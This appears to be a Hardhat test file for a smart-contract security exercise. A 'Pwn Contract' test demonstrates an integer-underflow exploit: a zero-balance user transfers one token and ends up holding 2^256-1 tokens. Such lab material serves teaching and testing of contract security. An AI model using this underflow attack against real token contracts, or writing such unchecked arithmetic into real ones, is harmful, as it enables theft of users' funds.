import { ethers } from 'hardhat';
import chai from 'chai';
import { Token__factory, Token } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { BigNumber } from '@ethersproject/bignumber';

const { expect } = chai;

let token: Token;
let tokenFactory: Token__factory;

let wallets: SignerWithAddress[];
let deployerWallet: SignerWithAddress;
let userWallet: SignerWithAddress;

describe('Token Tests', () => {
    const initialSupply: BigNumber = ethers.BigNumber.from('20');

    beforeEach(async () => {
        wallets = await ethers.getSigners();
        deployerWallet = wallets[0];
        userWallet = wallets[1];

        tokenFactory = (await ethers.getContractFactory(
            'Token',
            deployerWallet
        )) as Token__factory;

        token = (await tokenFactory.deploy(initialSupply)) as Token;

        expect(token.address).to.be.properAddress;
    });

    describe('Function tests', async () => {
        it('Balance of deployer wallet to be equal to initialSupply', async () => {
            expect(await token.balanceOf(deployerWallet.address)).to.equal(initialSupply);
        });
    });

    describe('Pwn Contract', async () => {
        it('Cause Integer Underflow', async () => {
            // User has no tokens
            expect(await token.balanceOf(userWallet.address)).to.equal(0);

            // Transfer causing underflow
            const underflowAmt: BigNumber = ethers.BigNumber.from('1');
            await token.connect(userWallet).transfer(deployerWallet.address, underflowAmt);

            // User now has tons of tokens
            const tonsTokens: BigNumber = ethers.BigNumber.from(2).pow(256).sub(1);
            expect(await token.balanceOf(userWallet.address)).to.equal(tonsTokens);

            // Deployer now has 21 tokens
            const deployerTokens: BigNumber = ethers.BigNumber.from('21');
            expect(await token.balanceOf(deployerWallet.address)).to.equal(deployerTokens);
        });
    });
});


